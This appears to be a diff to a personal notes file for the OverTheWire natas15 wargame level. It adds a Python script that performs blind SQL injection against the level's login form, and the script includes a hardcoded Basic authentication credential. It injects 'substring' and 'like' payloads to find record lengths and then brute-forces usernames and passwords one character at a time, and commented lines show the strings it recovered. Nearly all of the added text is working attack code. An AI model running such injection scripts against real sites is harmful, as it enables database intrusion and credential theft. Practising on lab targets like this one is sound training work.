@@ -533,10 +533,151 @@ bob (3)
 alice (5)
 charlie (7)
 ->
-add db_enum_users.py here
-->
-got infinite loop when tried to enumerate password column
-W.I.P db_enum_pass.py
+import requests
+
+url = "http://natas15.natas.labs.overthewire.org/index.php"
+headers = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Origin": "http://natas15.natas.labs.overthewire.org",
+    "DNT": "1",
+    "Authorization": "Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==",
+    "Connection": "close",
+    "Referer": "http://natas15.natas.labs.overthewire.org/",
+    "Upgrade-Insecure-Requests": "1",
+}
+body = {
+    "username": None # payload goes here
+}
+
+lower_charset = "abcdefghijklmnopqrstuvwxyz"
+upper_charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+numbers_charset = "0123456789"
+#special_charset = "`~!@#$%^&*()-_=+[{]}\\|;:'\",<.>/?"
+all_charset = lower_charset + upper_charset + numbers_charset
+
+error_msg = ("This user doesn't exist", "Error in query")
+success_msg = "This user exists."
+
+                  
+def record_length_enum(column="", length=-1):
+    length_found = []
+
+    if (column == "" and length == -1):
+        return
+    
+    for num in range(length):
+        if num == 0: continue
+
+        # payload request
+        body["username"] = f"\"or ({column} like \'{'_' * num}');#"
+        print(body["username"])
+        response = requests.post(url, headers=headers, data=body).text
+        print(response)
+
+        if (success_msg in response):
+            length_found.append(num)
+
+    return length_found
+
+def record_enum(column="", lengths=[]):
+    if (column == "" and lengths == []): 
+        print("didnt supply column & record lengths list")
+        return
+
+    cracked = [''] * len(lengths) # new list with default value times len of existing list
+    position = 1 # substring length
+    isStartedCharSet = False
+    for curr_cracked in range(len(cracked)): # for every record being cracked
+        while (len(cracked[curr_cracked]) < lengths[curr_cracked]): # until we didnt finish cracking curr record
+            for curr_char in all_charset: # try every char in all of the charsets                
+                # payload request
+                body["username"] = f"\"or (substring({column}, 1, {position}) = '{cracked[curr_cracked] + curr_char}');#"
+                print(body["username"])
+                response = requests.post(url, headers=headers, data=body).text
+                print(response)
+
+                if (success_msg in response):
+                    cracked[curr_cracked] += curr_char
+                    isStartedCharSet = False # if we get a success we didnt finish cracking yet
+                    break # we found a charcter now move to next position (/next character)
+
+                # infinite (character) loop break
+                if (not isStartedCharSet):
+                    isStartedCharSet = True
+                    last_charset_letter = all_charset[len(all_charset)-1]
+                # meaninig we started looping and restarted charset 
+                elif (curr_char == last_charset_letter and isStartedCharSet): 
+                    cracked[curr_cracked] = ''
+                    return cracked
+            position += 1
+        
+        position = 1 #after 1 successfull crack
+    return cracked
+
+
+# ------------------------------------------------
+# part 1 - blind sqli to find rows lenth
+# ------------------------------------------------
+#
+#username_records_lengths = (record_length_enum("username", 50))
+#password_records_lengths  = (record_length_enum("password", 50))
+#
+#print(f"found (username) rows: {len(username_records_lengths)}")
+#[print(f"row {row_num + 1}, record length {username_records_lengths[row_num]}") 
+#for row_num in range((len(username_records_lengths)))]
+#
+#print(f"\nfound (password) rows: {len(password_records_lengths)}")
+#[print(f"row {row_num + 1}, record length {password_records_lengths[row_num]}") 
+#for row_num in range((len(password_records_lengths)))]
+
+
+# ------------------------------------------------
+# part 2 - blind sqli to crack rows (letter by letter)
+# ------------------------------------------------
+#print(record_enum("username", [3, 5, 7]))
+#print(record_enum("password", [10, 32]))
+
+
+# ------------------------------------------------
+# part 3 - reconfigure charset to skip existing cracked 
+# ------------------------------------------------
+# lower_charset = "abcdefghijklmnopqrstuvwxyz" # ==> ['ali', 'alice', '']
+# all_charset = lower_charset + upper_charset + numbers_charset
+# print(record_enum("username", [3, 5, 7]))
+
+# lower_charset = "bcdefghijklmnopqrstuvwxyza" # ==> ['bob', '', '']
+# all_charset = lower_charset + upper_charset + numbers_charset
+# print(record_enum("username", [3, 5, 7]))
+
+# lower_charset = "cdefghijklmnopqrstuvwxyzab" # ==> ['cha', 'charl', 'charlie']
+# all_charset = lower_charset + upper_charset + numbers_charset
+# print(record_enum("username", [3, 5, 7]))
+
+# lower_charset = "abcdefghijklmnopqrstuvwxyz" # ==> ['hlwugkts2w', '']
+# all_charset = lower_charset + upper_charset + numbers_charset
+# print(record_enum("password", [10, 32]))
+
+# lower_charset = "ijklmnopqrstuvwxyzabcdefgh" # ==> ['trd7izrd5g', 'trd7izrd5gatjj9pkpeuaolfejhqj32v']
+# all_charset = lower_charset + upper_charset + numbers_charset
+# print(record_enum("password", [10, 32]))
+
+# upper_charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" # ==> ['HLWUGKTS2W', '']
+# all_charset = upper_charset + lower_charset + numbers_charset
+# print(record_enum("password", [10, 32]))
+
+# upper_charset = "UVWXYZABCDEFGHIJKLMNOPQRST" # ==> ['TRD7IZRD5G', 'TRD7IZRD5GATJJ9PKPEUAOLFEJHQJ32V']
+# all_charset = upper_charset + lower_charset + numbers_charset
+# print(record_enum("password", [10, 32]))
+
+upper_charset = "UVWXYZABCDEFGHIJKLMNOPQRST" # ==> 
+all_charset = upper_charset + lower_charset + numbers_charset
+print(record_enum("password", [10, 32]))
+
+
 ->
 charlie" and password='hlwugkts2w';# ==> user exists
 ->
